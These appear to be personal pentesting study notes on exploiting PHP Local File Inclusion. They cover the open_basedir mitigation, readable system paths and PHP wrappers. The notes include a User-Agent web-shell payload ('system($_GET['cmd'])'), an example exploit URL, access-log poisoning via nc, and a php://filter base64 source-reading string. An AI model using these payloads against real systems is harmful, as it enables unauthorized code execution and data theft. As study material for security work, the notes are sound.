# LFI

LFI mitigiation:
~~~
open_basedir = On in php.ini

(if this is on, PHP can't access any file outside the specified directory) , essentially kills the purpose of include statements in other directories such as libraries)
~~~

Techniques which can be used to leverage LFI:
~~~
- /proc/self/environ
- /proc/self/fd
- /var/log/apache2/access.log
- /var/log/auth.log
- php://input wrapper
- php://filter wrapper
- data:wrapper
~~~

Great source for in-depth detail of exploiting vulnerabilities: https://resources.infosecinstitute.com/local-file-inclusion-code-execution/

## /proc/self/environ

Contains environment variables
   - REMOTE_PORT
   - HTTP_USER_AGENT
   - etc

`SHOULD NOT BE ACCESSIBLE FROM NON-ROOT USERS`

Exploit:

Intercept request and edit the User-Agent, and replace with php executable code.

Example:
User-Agent: <?php system($_GET['cmd']); ?>

After the request is sent to the server,

include /proc/self/environ in the LFI, and append your PHP code.

http://localhost/index.php?file=/proc/self/environ&cmd=whoami

## /var/log/apache2/access.log

`Should not be accessible from non-root users`

Access.log logs all requests to the web server (including 404s), though excludes 400s (bad server request)

To exploit, send a HTTP request containing php code using nc & include access.log using the LFI

(Images from Infosec Institute)

![nc](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/080416_0223_FromLocalFi8.png)

## PHP Filters

Convert file output to base64:

The reason you would want to convert a php file to base64 is because if the php file is included in the LFI, the php file itself will execute and you will not be able to see the source code.

By using the filter to convert the output to base64, we can then decode the output and see the source

~~~
php://filter/read=convert.base64-encode/resource=FILE
~~~

Read about the different PHP filters: https://highon.coffee/blog/lfi-cheat-sheet/

# include subpage about 'files of interest' in LFI



